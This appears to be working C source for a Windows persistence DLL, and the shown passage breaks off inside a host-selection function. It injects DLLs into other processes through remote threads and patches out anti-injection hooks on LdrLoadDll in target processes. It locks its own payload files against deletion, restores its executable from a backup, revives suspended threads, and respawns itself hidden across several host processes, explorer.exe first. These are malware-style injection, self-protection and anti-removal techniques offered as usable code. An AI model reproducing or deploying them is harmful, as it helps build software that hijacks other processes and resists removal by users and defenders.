/*
 * svcguard.dll - 守护与复活（日志格式化已修正）
 * 编译：gcc -shared -o svcguard.dll deamon.c -ladvapi32 -lpsapi -lshell32 -static -s -O2
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* guard.dll 部署到几个宿主进程（同会话） */
#define GUARD_HOST_MAX  4

static HANDLE g_hSharedMem = NULL;
static PVOID  g_pSharedView = NULL;
static WCHAR  g_szXxExePath[MAX_PATH] = L"";
static WCHAR  g_szWindowDllPath[MAX_PATH] = L"";
static WCHAR  g_szDeamonDllPath[MAX_PATH] = L"";
static WCHAR  g_szGuardDllPath[MAX_PATH] = L"";
static WCHAR  g_szOwnDir[MAX_PATH] = L"";
static DWORD  g_guardPids[GUARD_HOST_MAX] = { 0 };
static int    g_guardCount = 0;
static volatile LONG g_bExitFlag = 0;
static CRITICAL_SECTION g_csLog;
static BOOL g_csLogInit = FALSE;

/* 前置声明（HeartbeatMonitor 会用到后面定义的这两个判定） */
static BOOL IsRunningInXxExe(void);
static BOOL IsProtected(LPCWSTR name);
static BOOL InitPaths(void);
static void ForceWindowRestartInHosts(void);

/* 注入缓存：避免每轮对所有进程反复 OpenProcess / EnumProcessModules / 远程线程。
   每 INJ_REFRESH_MS 全量重扫一次，兼顾 PID 复用与后续被卸载的情况。 */
#define INJ_CACHE_MAX   2048
#define INJ_REFRESH_MS  10000
static DWORD g_injPid[INJ_CACHE_MAX];
static int   g_injCount = 0;
static DWORD g_injLastRefresh = 0;

static BOOL InjCacheHas(DWORD pid) {
    for (int i = 0; i < g_injCount; i++)
        if (g_injPid[i] == pid) return TRUE;
    return FALSE;
}
static void InjCacheAdd(DWORD pid) {
    if (g_injCount < INJ_CACHE_MAX) g_injPid[g_injCount++] = pid;
}

/* 被目标明确拒绝过的 PID（远端 LoadLibrary 返回 0：32 位进程、受保护进程、
   或被对手反注入拦住且我们拆不掉）。拉黑一段时间，避免每 10 秒重复刷屏。 */
#define REJECT_MAX      64
#define REJECT_TTL_MS   120000
static DWORD g_rejPid[REJECT_MAX];
static DWORD g_rejTick[REJECT_MAX];
static int   g_rejCount = 0;

static BOOL RejectedRecently(DWORD pid) {
    DWORD now = GetTickCount();
    for (int i = 0; i < g_rejCount; i++) {
        if (g_rejPid[i] != pid) continue;
        if (now - g_rejTick[i] < REJECT_TTL_MS) return TRUE;
        return FALSE;                       /* 过期：放行重试 */
    }
    return FALSE;
}

static void MarkRejected(DWORD pid) {
    for (int i = 0; i < g_rejCount; i++) {
        if (g_rejPid[i] == pid) { g_rejTick[i] = GetTickCount(); return; }
    }
    if (g_rejCount < REJECT_MAX) {
        g_rejPid[g_rejCount] = pid;
        g_rejTick[g_rejCount] = GetTickCount();
        g_rejCount++;
    }
}
static void InjCacheRefreshIfDue(void) {
    DWORD now = GetTickCount();
    if (g_injLastRefresh == 0 || now - g_injLastRefresh >= INJ_REFRESH_MS) {
        g_injCount = 0;
        g_injLastRefresh = now;
    }
}

static void EnsureLogInit(void) {
    if (g_csLogInit) return;
    InitializeCriticalSection(&g_csLog);
    g_csLogInit = TRUE;
    if (!g_pSharedView) {
        g_hSharedMem = XXOpenShared();
        if (g_hSharedMem)
            g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
    }
}

/* 日志：共享内存窗口 + %TEMP%\xx_debug.log（没有弹窗时只能靠文件日志排查） */
static void WriteDeamonLog(const WCHAR* fmt, ...) {
    WCHAR szLine[512];
    WCHAR fline[640];
    va_list args;

    EnsureLogInit();

    va_start(args, fmt);
    _vsnwprintf(szLine, _countof(szLine) - 1, fmt, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    /* 先落文件：g_pSharedView 为空时原来的实现直接 return，什么都看不到 */
    _snwprintf(fline, _countof(fline) - 1, L"[deamon][pid=%lu] %s\r\n",
               GetCurrentProcessId(), szLine);
    fline[_countof(fline) - 1] = L'\0';
    XXFileLog(fline);

    if (!g_pSharedView) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [deamon] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    EnterCriticalSection(&g_csLog);
    WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t len = XXLogLen(pLog, maxLen + 1);
    if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }
    size_t newLen = wcslen(entry);
    if (len + newLen <= maxLen) {
        /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
        wcscat_s(pLog, maxLen + 1 - len, entry);
    } else {
        /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
        size_t drop = len + newLen - maxLen;
        if (drop < len) {
            memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
            pLog[len - drop] = L'\0';
        } else {
            pLog[0] = L'\0';
        }
        wcscat_s(pLog, maxLen + 1 - wcslen(pLog), entry);
    }
    LeaveCriticalSection(&g_csLog);
}

static BOOL OpenSharedMemory(void) {
    for (int i = 0; i < 5; i++) {
        g_hSharedMem = XXOpenShared();
        if (g_hSharedMem) {
            g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
            if (g_pSharedView) return TRUE;
            CloseHandle(g_hSharedMem);
        }
        Sleep(1000);
    }
    return FALSE;
}

static BOOL InitPaths(void) {
    WCHAR dllPath[MAX_PATH];
    if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH))
        return FALSE;

    WCHAR* pSlash = wcsrchr(dllPath, L'\\');
    if (pSlash) {
        *(pSlash + 1) = L'\0';       /* 截断到目录 */
    } else {
        /* 没有反斜杠，可能只有驱动器号，补上反斜杠 */
        wcscat_s(dllPath, MAX_PATH, L"\\");
    }

    swprintf_s(g_szXxExePath, MAX_PATH, L"%sxx.exe", dllPath);
    swprintf_s(g_szWindowDllPath, MAX_PATH, L"%swindow.dll", dllPath);
    swprintf_s(g_szDeamonDllPath, MAX_PATH, L"%ssvcguard.dll", dllPath);
    swprintf_s(g_szGuardDllPath, MAX_PATH, L"%sguard.dll", dllPath);
    wcsncpy_s(g_szOwnDir, MAX_PATH, dllPath, _TRUNCATE);

    WriteDeamonLog(L"Paths: xx=%ls, window=%ls, guard=%ls\n",
                   g_szXxExePath, g_szWindowDllPath, g_szGuardDllPath);
    return TRUE;
}

/* ================== 我方文件锁 ==================
   Windows 允许删除正在运行的镜像（加载器带 FILE_SHARE_DELETE），所以我们的
   xx.exe / dll / xxres.bin 默认能被对手直接删掉；文件一旦没了，新的注入就没有
   东西可注入，整条复活链会静默失效（实测确认：不持锁时删运行中的 exe 是成功的）。

   这里用 access=0 + FILE_SHARE_READ 持住每个文件（实测结论）：
     - share=0 连正在运行的镜像都打不开，必须留 FILE_SHARE_READ；
     - 留了 READ 之后：删除 / 改名 / 覆盖写入 全部被拒（跨进程同样有效），
       而读取与 LoadLibrary 仍然成功 —— 也就是不影响我们自己 CopyFileW 备份/还原
       与把 dll 注入到别的进程。 */
static const WCHAR *g_ownFiles[] = {
    L"xx.exe", L"svcguard.dll", L"window.dll", L"atkcore.dll",
    L"payload.dll", L"payload.bin", L"guard.dll", L"defense.dll",
    L"xxres.bin", NULL
};
#define OWN_LOCK_MAX 16
static HANDLE g_ownLocks[OWN_LOCK_MAX];

static void LockOwnFiles(void) {
    int i;
    if (g_szOwnDir[0] == L'\0' && !InitPaths()) return;
    for (i = 0; g_ownFiles[i] && i < OWN_LOCK_MAX; i++) {
        WCHAR path[MAX_PATH];
        HANDLE h;
        if (g_ownLocks[i]) continue;
        swprintf_s(path, MAX_PATH, L"%s%s", g_szOwnDir, g_ownFiles[i]);
        h = CreateFileW(path, 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) g_ownLocks[i] = h;
    }
}

/* 每个宿主里的 svcguard 都持一份：xx.exe 被杀后锁依然在，文件删不掉 */
static DWORD WINAPI OwnFileShieldThread(LPVOID lp) {
    UNREFERENCED_PARAMETER(lp);
    Sleep(1500);
    for (;;) {
        LockOwnFiles();
        Sleep(2000);
    }
    return 0;
}

/* xx.exe 被对手删除时，从同目录 xxres.bin 备份还原 */
static void EnsureXxExeExists(void) {
    if (GetFileAttributesW(g_szXxExePath) != INVALID_FILE_ATTRIBUTES) return;
    WCHAR dir[MAX_PATH], bak[MAX_PATH];
    wcscpy_s(dir, MAX_PATH, g_szXxExePath);
    WCHAR *p = wcsrchr(dir, L'\\');
    if (p) *(p + 1) = L'\0';
    swprintf_s(bak, MAX_PATH, L"%sxxres.bin", dir);
    if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES) {
        if (CopyFileW(bak, g_szXxExePath, FALSE))
            WriteDeamonLog(L"已从备份还原 xx.exe: %ls\n", g_szXxExePath);
    }
}

/* 弹窗存活判据 = 共享内存心跳计数器（window.dll 弹窗每 500ms 递增一次）。
   不再等待事件对象：手动重置事件 SetEvent 之后永不超时，超时复活分支是死代码，
   而且忙等会吃满一个核。监视循环见下方 HeartbeatMonitor（定义在 RespawnXX 之后）。 */

static BOOL IsXxProcessRunning(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    PROCESSENTRY32W pe = { sizeof(pe) };
    BOOL found = FALSE;
    if (Process32FirstW(h, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"xx.exe") == 0) { found = TRUE; break; }
        } while (Process32NextW(h, &pe));
    }
    CloseHandle(h);
    return found;
}

/* 按名字找 xx.exe 的 PID（对手会先把 xx 的线程全部挂起再终止，挂起成功而
   终止失败就会留下一个"僵住"的 xx.exe —— 它能让 IsXxProcessRunning 永远为真） */
static DWORD FindXxPid(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;
    if (h == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(h, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"xx.exe") == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(h, &pe));
    }
    CloseHandle(h);
    return pid;
}

/* 尽力把某个进程里被挂起的线程恢复回来（与 guard.dll 的恢复逻辑同源） */
static void ResumePidThreads(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    int resumed = 0;
    if (hSnap == INVALID_HANDLE_VALUE) return;
    THREADENTRY32 te = { sizeof(te) };
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE h = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (h) {
                    while (ResumeThread(h) > 0) resumed++;
                    CloseHandle(h);
                }
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    if (resumed > 0)
        WriteDeamonLog(L"恢复了 PID=%lu 的 %d 个被挂起线程\n", pid, resumed);
}

/* 复活必须发生在 xx 原来的登录会话里：别的会话（尤其 session 0）拉起来的
   xx.exe 弹窗在非交互桌面上，等于白复活还占资源。共享内存读不到就放行。 */
static BOOL RespawnSessionOk(void) {
    DWORD mine = 0;
    LONG  rec;
    if (!g_pSharedView) return TRUE;
    rec = XX_SESSION(g_pSharedView);
    if (rec == 0) return TRUE;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mine)) return TRUE;
    if ((LONG)mine == rec) return TRUE;
    WriteDeamonLog(L"本实例在会话 %lu，xx 上次在会话 %ld，跳过复活（避免影子实例）\n", mine, rec);
    return FALSE;
}

static void RespawnXX(BOOL bForce) {
    /* 多实例（各宿主里的 svcguard + defense 看门狗）可能同时判定需要复活，
       用命名互斥锁串行化，避免同一时刻拉起多个 xx.exe。 */
    HANDLE hOnce = CreateMutexW(NULL, FALSE, L"Global\\xx_respawn_guard");
    DWORD  w = hOnce ? WaitForSingleObject(hOnce, 3000) : WAIT_OBJECT_0;
    BOOL   bOwn = (hOnce != NULL && (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED));

    if (hOnce && !bOwn) {
        CloseHandle(hOnce);
        WriteDeamonLog(L"另一个实例正在复活 xx.exe，跳过\n");
        return;
    }

    if (!RespawnSessionOk()) {
        if (bOwn) ReleaseMutex(hOnce);
        if (hOnce) CloseHandle(hOnce);
        return;
    }

    WriteDeamonLog(L"检测到 xx 心跳丢失，准备复活 xx.exe: %ls\n", g_szXxExePath);
    EnsureXxExeExists();
    if (GetFileAttributesW(g_szXxExePath) == INVALID_FILE_ATTRIBUTES) {
        WriteDeamonLog(L"xx.exe 文件不存在，无法复活: %ls\n", g_szXxExePath);
    } else if (IsXxProcessRunning() && !bForce) {
        /* 已有实例在运行就不重复拉起（避免与 defense.dll 看门狗双重复活） */
        WriteDeamonLog(L"xx.exe 已在运行，跳过复活\n");
    } else {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        if (IsXxProcessRunning()) {
            /* bForce：存在一个"活着但不产生弹窗"的 xx.exe（典型是被对手挂起后
               终止失败），先尽力解挂，再照样拉一个新实例 —— 有实例总比没弹窗强。 */
            DWORD xxPid = FindXxPid();
            WriteDeamonLog(L"xx.exe 已在运行但心跳仍停摆 -> 强制再拉一个实例 (old pid=%lu)\n", xxPid);
            if (xxPid) ResumePidThreads(xxPid);
        }
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        if (!CreateProcessW(g_szXxExePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            ShellExecuteW(NULL, L"open", g_szXxExePath, NULL, NULL, SW_HIDE);
            WriteDeamonLog(L"复活方式=ShellExecute\n");
        } else {
            WriteDeamonLog(L"复活方式=CreateProcess 成功 新PID=%lu\n", pi.dwProcessId);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    if (bOwn) ReleaseMutex(hOnce);
    if (hOnce) CloseHandle(hOnce);
}

/* 心跳停摆但 xx.exe 还活着时，RespawnXX 会因为"已有实例在运行"而跳过，
   弹窗可能就永远回不来（window.dll 被对手卸载/加载失败）。这里补一刀：
   若本实例就在 xx.exe 内，且 window.dll 不在本进程里，就地重新加载。 */
static void EnsureWindowModuleHere(void) {
    if (!IsRunningInXxExe()) return;
    if (GetModuleHandleW(L"window.dll")) return;
    if (g_szWindowDllPath[0] == L'\0' && !InitPaths()) return;
    if (LoadLibraryW(g_szWindowDllPath))
        WriteDeamonLog(L"心跳停摆：已重新加载 window.dll\n");
    else
        WriteDeamonLog(L"心跳停摆：重新加载 window.dll 失败 err=%lu\n", GetLastError());
}

static DWORD WINAPI HeartbeatMonitor(LPVOID lp) {
    LONG lastTick;
    DWORD lastChange;
    DWORD lastRecover = 0;
    BOOL bStale = FALSE;

    UNREFERENCED_PARAMETER(lp);
    WriteDeamonLog(L"HeartbeatMonitor started\n");

    /* 共享内存可能比本实例晚就绪；拿不到就等着，绝不因此自我卸载
       （模块已注入宿主进程，退出就再也不会被重新注入）。 */
    for (;;) {
        if (g_bExitFlag) return 0;
        if (!g_pSharedView) OpenSharedMemory();
        if (g_pSharedView) break;
        Sleep(500);
    }
    if (g_szXxExePath[0] == L'\0' && !InitPaths())
        WriteDeamonLog(L"InitPaths failed\n");

    InterlockedIncrement(&XX_COUNTER(g_pSharedView));

    lastTick = XX_HB_TICK(g_pSharedView);
    lastChange = GetTickCount();

    while (!g_bExitFlag) {
        LONG cur;
        DWORD now;

        Sleep(HEARTBEAT_POLL_MS);
        now = GetTickCount();
        cur = XX_HB_TICK(g_pSharedView);

        if (cur != lastTick) {              /* 弹窗还活着 */
            lastTick = cur;
            lastChange = now;
            bStale = FALSE;
            continue;
        }
        if (now - lastChange < HEARTBEAT_STALE_MS) continue;

        if (!bStale) {
            bStale = TRUE;
            WriteDeamonLog(L"弹窗心跳停摆 %lums，开始恢复\n",
                           (unsigned long)(now - lastChange));
        }
        /* 恢复动作按 HEARTBEAT_RECOVER_MS 节流：xx 还活着时 RespawnXX 只会空转，
           没必要每 2.5 秒重扫一遍进程表。 */
        if (lastRecover != 0 && now - lastRecover < HEARTBEAT_RECOVER_MS) continue;

        lastRecover = now;
        lastChange = now;
        lastTick = XX_HB_TICK(g_pSharedView);
        /* 三级恢复：先把本进程的弹窗模块补上，再让宿主里死掉的弹窗线程复活，
           最后拉起 xx.exe。走到这里说明心跳已经停摆（≥2.5 秒没弹窗），
           所以复活用强制模式：若存在一个"活着但不产弹窗"的 xx.exe（对手把线程
           全挂起后终止失败就会留下这种僵住进程），不能因为"已在运行"就永远跳过。
           整个恢复动作已按 HEARTBEAT_RECOVER_MS(10s) 节流，不会造成进程风暴。 */
        EnsureWindowModuleHere();
        ForceWindowRestartInHosts();
        RespawnXX(TRUE);
    }

    InterlockedDecrement(&XX_COUNTER(g_pSharedView));
    return 0;
}

static BOOL IsProtected(LPCWSTR name) {
    static LPCWSTR list[] = {
        L"System", L"smss.exe", L"csrss.exe", L"wininit.exe",
        L"services.exe", L"lsass.exe", L"winlogon.exe",
        L"spoolsv.exe", L"dwm.exe", L"taskhost.exe",
        /* notepad.exe：atkcore 把 notepad 当"敌方宿主"击杀，若我们也往
           notepad 注入 window.dll，弹窗就可能被自己 30ms 一轮的攻击秒掉。 */
        L"notepad.exe", NULL
    };
    for (int i = 0; list[i]; i++)
        if (_wcsicmp(name, list[i]) == 0) return TRUE;
    return FALSE;
}

/* ================== 反"反注入"：还原目标进程里被改写的 LdrLoadDll ==================
   对手会在自己的进程/宿主进程里 hook ntdll!LdrLoadDll，按键名把我们的
   svcguard.dll / window.dll 直接拒掉（LoadLibrary 返回 0）。这时 CreateRemoteThread
   本身是成功的，所以不看返回值就会误报"注入成功"，现象正是"别的进程里没有我们的 dll"。
   这里注入前先把目标进程里被改掉的 LdrLoadDll 前导字节写回原始值 ——
   我们已经持有 PROCESS_VM_WRITE/VM_OPERATION。 */
#define LDR_PATCH_LEN 16

/* 原始字节必须来自磁盘上的 ntdll（SEC_IMAGE 映射，内容干净）：
   不能读我们自己进程里的字节 —— defense.dll 在 xx.exe 内就把 LdrLoadDll hook 了，
   照抄会把我们自己的 hook 复制到目标进程。 */
static BOOL ReadPristineNtdllBytes(ULONG_PTR rva, BYTE *out, SIZE_T len) {
    WCHAR sys[MAX_PATH], path[MAX_PATH];
    HANDLE hf, hm = NULL;
    void *view = NULL;
    BOOL ok = FALSE;

    if (!GetSystemDirectoryW(sys, MAX_PATH)) return FALSE;
    swprintf_s(path, MAX_PATH, L"%s\\ntdll.dll", sys);
    hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    hm = CreateFileMappingW(hf, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (hm) {
        view = MapViewOfFile(hm, FILE_MAP_READ, 0, 0, 0);
        if (view) {
            memcpy(out, (BYTE *)view + rva, len);
            ok = TRUE;
            UnmapViewOfFile(view);
        }
        CloseHandle(hm);
    }
    CloseHandle(hf);
    return ok;
}

static void RepairTargetLdrHook(HANDLE hProc, DWORD pid) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    BYTE *fn;
    BYTE cur[LDR_PATCH_LEN], pristine[LDR_PATCH_LEN];
    SIZE_T rd = 0;
    DWORD old = 0;

    if (!hNtdll) return;
    fn = (BYTE *)GetProcAddress(hNtdll, "LdrLoadDll");
    if (!fn) return;

    if (!ReadProcessMemory(hProc, fn, cur, LDR_PATCH_LEN, &rd) || rd != LDR_PATCH_LEN)
        return;
    if (!ReadPristineNtdllBytes((ULONG_PTR)(fn - (BYTE *)hNtdll), pristine, LDR_PATCH_LEN))
        return;
    if (memcmp(cur, pristine, LDR_PATCH_LEN) == 0) return;      /* 没被改，正常 */

    if (VirtualProtectEx(hProc, fn, LDR_PATCH_LEN, PAGE_EXECUTE_READWRITE, &old)) {
        if (WriteProcessMemory(hProc, fn, pristine, LDR_PATCH_LEN, &rd))
            WriteDeamonLog(L"已还原 PID=%lu 里被改写的 LdrLoadDll（反注入 hook）\n", pid);
        VirtualProtectEx(hProc, fn, LDR_PATCH_LEN, old, &old);
    }
}

static BOOL InjectDll(HANDLE hProc, LPCWSTR dllPath, DWORD pid) {
    SIZE_T size = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    LPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!pMem) {
        WriteDeamonLog(L"注入失败 VirtualAllocEx PID=%lu dll=%ls\n", pid, dllPath);
        return FALSE;
    }
    WriteProcessMemory(hProc, pMem, dllPath, size, NULL);
    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pMem, 0, NULL);
    BOOL ok = FALSE;
    if (hThread) {
        DWORD code = 0;
        WaitForSingleObject(hThread, 5000);
        /* 远端线程的退出码就是宿主里 LoadLibraryW 的返回值（HMODULE）：
           0 = 载入失败（被对手反注入 hook 拦下、文件被删、位数不符等）。
           以前只看线程是否创建成功，会把这种失败当成注入成功。 */
        if (GetExitCodeThread(hThread, &code)) {
            ok = (code != 0);
            if (!ok)
                WriteDeamonLog(L"注入被目标拒绝: %ls -> PID=%lu（远端 LoadLibrary 返回 0）\n",
                               dllPath, pid);
        } else {
            ok = TRUE;
        }
        CloseHandle(hThread);
    } else {
        WriteDeamonLog(L"注入 DLL 失败 PID=%lu dll=%ls err=%lu\n", pid, dllPath, GetLastError());
    }
    VirtualFreeEx(hProc, pMem, 0, MEM_RELEASE);
    return ok;
}

/* ================== guard.dll 宿主部署与句柄交接 ==================
   xx.exe 不再自己加载 guard.dll：那样 xx 一旦被结束，guard 会跟着一起死，
   根本没机会复活 xx。改由这里（跑在 xx.exe 内的 svcguard 实例）把 guard.dll
   注入到同会话的宿主进程，并把 **xx 自己的进程句柄** 复制进宿主、登记到共享
   内存句柄表。guard 侧直接用该句柄判活，不再需要 OpenProcess —— xx 的进程
   DACL 把 Everyone 全拒了，OpenProcess 那条路本来就走不通。 */

static BOOL IsRunningInXxExe(void) {
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *base;
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;
    return (_wcsicmp(base, XX_EXE_NAME_W) == 0);
}

static BOOL IsSameSession(DWORD pid) {
    DWORD mine = 0, sid = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mine)) return FALSE;
    if (!ProcessIdToSessionId(pid, &sid)) return FALSE;
    return (mine == sid);
}

static BOOL GuardHostKnown(DWORD pid) {
    for (int i = 0; i < g_guardCount; i++)
        if (g_guardPids[i] == pid) return TRUE;
    return FALSE;
}

static BOOL HostHasOurGuard(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    HMODULE mods[1024];
    DWORD needed = 0, count, i;
    BOOL found = FALSE;

    if (!h) return FALSE;
    if (EnumProcessModules(h, mods, sizeof(mods), &needed)) {
        count = needed / sizeof(HMODULE);
        for (i = 0; i < count && !found; i++) {
            WCHAR name[MAX_PATH];
            if (GetModuleFileNameExW(h, mods[i], name, MAX_PATH) &&
                _wcsicmp(name, g_szGuardDllPath) == 0)
                found = TRUE;
        }
    }
    CloseHandle(h);
    return found;
}

static void ClearHandleEntry(DWORD pid) {
    ULONGLONG tag;
    int i;
    if (!g_pSharedView) return;
    tag = (ULONGLONG)XX_TAG(g_pSharedView);
    for (i = 0; i < HDL_TABLE_MAX; i++) {
        if (XX_HDL_PID(g_pSharedView, i) == pid && XX_HDL_TAG(g_pSharedView, i) == tag) {
            XX_HDL_PID(g_pSharedView, i)    = 0;
            XX_HDL_HANDLE(g_pSharedView, i) = 0;
            XX_HDL_TAG(g_pSharedView, i)    = 0;
        }
    }
}

/* 前置声明：Republish 用到后面定义的 PublishGuardHandle */
static void PublishGuardHandle(HANDLE hHost, DWORD pid);

/* 宿主进程消失 / 我们的 guard.dll 被卸掉后要腾出名额，否则再也不会补部署；
   宿主还在则重发一次句柄 —— xx 重启后 tag 与句柄都变了，不重发这个宿主就永远是死条目。 */
static BOOL RepublishGuardHandle(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!hProc) return FALSE;
    PublishGuardHandle(hProc, pid);
    CloseHandle(hProc);
    return TRUE;
}

static void DropGuardHost(int i) {
    ClearHandleEntry(g_guardPids[i]);
    g_guardPids[i] = g_guardPids[g_guardCount - 1];
    g_guardPids[g_guardCount - 1] = 0;
    g_guardCount--;
}

static void ValidateGuardHosts(void) {
    int i;
    for (i = 0; i < g_guardCount; i++) {
        if (HostHasOurGuard(g_guardPids[i])) {
            if (!RepublishGuardHandle(g_guardPids[i])) {
                WriteDeamonLog(L"guard 宿主无法重发句柄，改投其它宿主 PID=%lu\n", g_guardPids[i]);
                DropGuardHost(i);
                i--;
            }
        } else {
            WriteDeamonLog(L"guard 宿主失效，重新部署 PID=%lu\n", g_guardPids[i]);
            DropGuardHost(i);
            i--;
        }
    }
}

/* 把 xx 自己的进程句柄复制进 hHost，并登记到共享内存句柄表（按宿主 PID 取用）。
   权限只有 查询+同步：即使同一宿主里的对手 DLL 拿到了这个句柄值，也只能等待/查询，
   无法 TerminateProcess(xx)。句柄值只在宿主进程内有效，所以也不需要额外加密。 */
static void PublishGuardHandle(HANDLE hHost, DWORD pid) {
    HANDLE hSelf = NULL, hDup = NULL;
    ULONGLONG tag;
    int i, slot = -1;

    if (!g_pSharedView || !hHost) return;

    /* 源句柄：优先用 xx.exe 在收紧 DACL 之前打开、并写进共享内存的那一个
       （svcguard 与 xx 同进程，句柄值有效）；没有才现场开一次。
       伪句柄不能跨进程复制，所以这里不做那种"退化"。 */
    hSelf = (HANDLE)(ULONG_PTR)XX_SELF_HANDLE(g_pSharedView);
    if (hSelf && GetProcessId(hSelf) != GetCurrentProcessId())
        hSelf = NULL;                       /* 陈旧/无效值，别把别的对象复制进宿主 */

    if (hSelf) {
        if (!DuplicateHandle(GetCurrentProcess(), hSelf, hHost, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            WriteDeamonLog(L"自持句柄复制失败 err=%lu，改现场打开\n", GetLastError());
            hDup = NULL;
        }
    }
    if (!hDup) {
        hSelf = OpenProcess(XX_SHARED_HANDLE_ACCESS, FALSE, GetCurrentProcessId());
        if (hSelf) {
            if (!DuplicateHandle(GetCurrentProcess(), hSelf, hHost, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
                WriteDeamonLog(L"现场句柄复制失败 err=%lu\n", GetLastError());
                hDup = NULL;
            }
            CloseHandle(hSelf);
        }
    }
    if (!hDup) {
        WriteDeamonLog(L"guard 句柄交接失败 PID=%lu\n", pid);
        return;
    }
    /* 注意：hDup 是"在宿主进程里有效"的句柄值，本进程既不能用也不能关。 */

    tag = (ULONGLONG)XX_TAG(g_pSharedView);
    for (i = 0; i < HDL_TABLE_MAX; i++) {
        if (XX_HDL_PID(g_pSharedView, i) == pid && XX_HDL_TAG(g_pSharedView, i) == tag) {
            slot = i;
            break;
        }
    }
    if (slot < 0) {
        for (i = 0; i < HDL_TABLE_MAX; i++) {
            if (XX_HDL_PID(g_pSharedView, i) == 0 || XX_HDL_TAG(g_pSharedView, i) != tag) {
                slot = i;
                break;
            }
        }
    }
    if (slot < 0) slot = (int)(pid % HDL_TABLE_MAX);   /* 表满：按 PID 顶掉一格 */

    /* 发布顺序有讲究：句柄先写，pid/reserved 最后写。
       guard 侧要求 GetProcessId(handle) == reserved，所以"最后写的 reserved"
       等于给整条记录上了一个校验和 —— 中间态（新句柄 + 旧 reserved，或反过来）
       一定校验不过，会被读取方跳过，而不会把一个坏句柄送进 WaitForSingleObject。 */
    XX_HDL_HANDLE(g_pSharedView, slot)   = (ULONGLONG)(ULONG_PTR)hDup;
    XX_HDL_TAG(g_pSharedView, slot)      = tag;
    XX_HDL_RESERVED(g_pSharedView, slot) = GetCurrentProcessId();   /* 句柄指向的 xx PID */
    XX_HDL_PID(g_pSharedView, slot)      = pid;
    WriteDeamonLog(L"guard 句柄已登记 PID=%lu slot=%d\n", pid, slot);
}

static void EnsureGuardHosts(void) {
    DWORD cand[GUARD_HOST_MAX];
    int nCand = 0, pass, i;

    if (g_guardCount >= GUARD_HOST_MAX) return;
    if (g_szGuardDllPath[0] == L'\0') return;
    if (GetFileAttributesW(g_szGuardDllPath) == INVALID_FILE_ATTRIBUTES) return;

    /* pass 0 优先 explorer.exe（同会话里最稳），pass 1 用其它同会话进程补齐 */
    for (pass = 0; pass < 2 && g_guardCount + nCand < GUARD_HOST_MAX; pass++) {
